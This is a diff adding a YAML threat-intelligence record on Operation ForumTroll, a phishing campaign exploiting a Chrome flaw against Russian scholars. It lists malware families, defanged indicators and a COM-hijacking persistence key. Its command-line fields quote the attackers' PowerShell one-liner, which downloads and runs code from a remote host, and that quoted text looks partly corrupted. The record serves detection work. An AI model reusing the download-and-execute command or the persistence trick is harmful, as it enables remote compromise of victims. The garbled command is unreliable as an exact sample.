@@ -1,0 +1,55 @@
+description: Operation ForumTroll, a series of cyberattacks exploiting CVE-2025-2783
+  in Google Chrome, targeted Russian scholars with phishing emails containing malicious
+  archives leading to Tuoni framework deployment.
+attribution: ForumTroll APT group
+malware_families:
+- LeetAgent
+- Dante
+- Tuoni
+TTPs:
+  processes:
+  - powershell.exe
+  commandline:
+  - write-host JokyMeHT OTKpHBaeTCH...;$p=ccho \"\"\"h$ (echo Ttp)s\"\"\";irm \"\"\"$
+    (echo $p)://e-library[.]wiki/elib/validate.php?id=<redacted>\"\"\"|1iex;write-host
+    <ammmma> <Mma> <OruecTBO>.pdf
+  powershell:
+  - write-host JokyMeHT OTKpHBaeTCH...;$p=ccho \"\"\"h$ (echo Ttp)s\"\"\";irm \"\"\"$
+    (echo $p)://e-library[.]wiki/elib/validate.php?id=<redacted>\"\"\"|1iex;write-host
+    <ammmma> <Mma> <OruecTBO>.pdf
+  scripting_engine: []
+  registry_keys:
+  - HKCR\\CLSID\\{1f486a52-3cb1-48fd-8f50-b8dc300d9f9d}\\InProcServer32
+  image_load: []
+  network_connections:
+  - powershell.exe, https://e-library[.]wiki/elib/query.php?id=<8 pseudorandom letters
+    and digits>&key=<32 hexadecimal characters>, <port>
+  - powershell.exe, https://e-library[.]wiki/pdf/<8 pseudorandom letters and digits>.pdf,
+    <port>
+  file_activity:
+  - <LastName>_<FirstName>_<Patronymic>.zip
+  - <LastName>_<FirstName>_<Patronymic>.lnk
+  - '%localappdata%\\Microsoft\\Windows\\Explorer\\iconcache_<4 pseudorandom digits>.dll'
+  - <LastName>_<FirstName>_<Patronymic>.pdf
+  persistence:
+  - COM Hijacking via HKCR\\CLSID\\{1f486a52-3cb1-48fd-8f50-b8dc300d9f9d}\\InProcServer32
+  process_relations: []
+CVEs:
+- CVE-2025-2783
+IOCs:
+  hashes: []
+  ip_addresses:
+  - 193.65.18[.]14
+  domains:
+  - e-library[.]wiki
+  - fastly.net
+  urls:
+  - https://e-library[.]wiki/elib/wiki.php?id=<8 pseudorandom letters and digits>
+  - https://e-library[.]wiki/elib/query.php?id=<8 pseudorandom letters and digits>&key=<32
+    hexadecimal characters>
+  - https://e-library[.]wiki/pdf/<8 pseudorandom letters and digits>.pdf
+authors:
+- Georgy Kucherin
+reference: https://securelist.com/operation-forumtroll-new-targeted-campaign/118492/
+date_of_publication: December 17, 2025
+file_creation_date: December 19, 2025
